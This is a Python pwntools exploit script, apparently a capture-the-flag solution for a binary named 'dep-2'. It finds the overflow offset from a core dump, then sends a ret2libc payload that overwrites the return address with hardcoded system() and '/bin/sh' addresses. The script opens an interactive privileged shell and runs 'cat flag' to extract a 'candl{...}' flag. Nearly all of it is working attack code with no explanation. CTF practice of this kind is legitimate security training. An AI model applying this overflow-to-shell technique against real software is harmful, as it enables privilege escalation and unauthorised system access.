from pwn import *
import os

DEBUG = False 
file = "./dep-2"

env = {} 

# crash the process to get a core file and find the buffer address (still boilerplate)

io = process(file, env=env, setuid=False)
io.sendline(cyclic(10000)) 
io.wait()
core = io.corefile
buffer_address = core.stack.find(cyclic(50))
os.unlink(core.path) 

max_len = cyclic(1000).find(p32(core.eip))

# launch the main process (still boilerplate)
if DEBUG:
    context.log_level = 'DEBUG'
    context.terminal = ['tmux', 'splitw', '-h']
    io = gdb.debug(file, env=env, gdbscript='''
b *0x8048560
continue
''')

else:
    io = process(file, env=env)


# END SETUP BOILERPLATE
# BEGIN CHALLENGE-SPECIFIC CODE

system_addr = 0xf7e0f3d0
bin_sh_addr = 0xf7f501db


payload = b"A" * max_len + p32(system_addr) + b"A" * 4 + p32(bin_sh_addr)
io.send(payload)
io.interactive()

# END CHALLENGE-SPECIFIC CODE
# BEGIN FLAG RETRIEVAL BOILERPLATE

import re
io.sendlineafter(b'Spawning a privileged shell', b'cat flag')
flag = re.search(br'candl\{[ -z|~]*}', io.recvregex(br'candl\{[ -z|~]*}')).group(0)
print(flag)
